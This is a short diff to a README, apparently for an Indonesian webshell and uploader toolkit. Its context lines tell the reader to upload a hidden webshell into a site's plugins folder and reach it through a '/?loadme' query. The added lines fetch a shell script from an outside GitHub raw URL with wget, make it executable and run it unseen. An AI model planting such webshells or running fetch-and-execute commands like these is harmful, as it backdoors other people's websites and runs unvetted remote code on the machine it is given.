@@ -6,6 +6,12 @@ Penampakan Uploader
 
 Tinggal pake aja , Untuk hiddenme di Folder Webshell itu untuk upload di Plugins ( akses shell, root domain tambahin /?loadme )
 
+# sans.sh
+
+! wget https://raw.githubusercontent.com/ngeteng/tools/main/sans.sh &> /dev/null
+! chmod +x sans.sh
+! ./sans.sh
+
 # Contributing
 
 I welcome contributions from the public.
